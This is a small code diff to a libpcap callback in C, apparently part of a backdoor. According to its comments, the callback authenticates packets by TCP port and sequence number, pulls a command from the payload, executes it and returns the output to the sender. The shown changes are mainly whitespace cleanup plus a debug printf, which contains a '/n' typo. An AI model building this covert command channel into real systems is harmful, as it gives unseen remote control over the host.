@@ -52,13 +52,13 @@ void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* pa
     int loop;
     int tcp_sport;
     u_int tcp_seqnum;
-    
+
     char* payload;
     char* end_ptr;
 
     const struct sniff_ip* ip;
     const struct sniff_tcp* tcp;
-    
+
     int size_ip = 0;
     int size_tcp = 0;
 
@@ -70,7 +70,7 @@ void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* pa
 
     tcp_sport = ntohs(tcp->th_sport);
     tcp_seqnum = ntohl(tcp->th_seq);
-    
+
     // Step 1: Locate the payload of the packet
     payload = (char*)(packet + ETHER_IP_UDP_LEN);
     if ((header->caplen - ETHER_IP_UDP_LEN - 14) <= 0) // Why 14?
@@ -80,7 +80,7 @@ void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* pa
     }
 
     // Step 2: Authenticate the packet
-    if (!is_seq_num_auth(tcp_sport, tcp_seqnum)) 
+    if (!is_seq_num_auth(tcp_sport, tcp_seqnum))
     {
         printf("packet not authenticated\n");
         printf("source port: %d\n", tcp_sport);
@@ -104,6 +104,7 @@ void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* pa
     strncpy(command, payload, end_ptr - payload);
 
     // Step 6: Execute the command
+    printf("executing command: %s/n", command);
 
     // Step 7: Send the command's output to the sender of the command
 
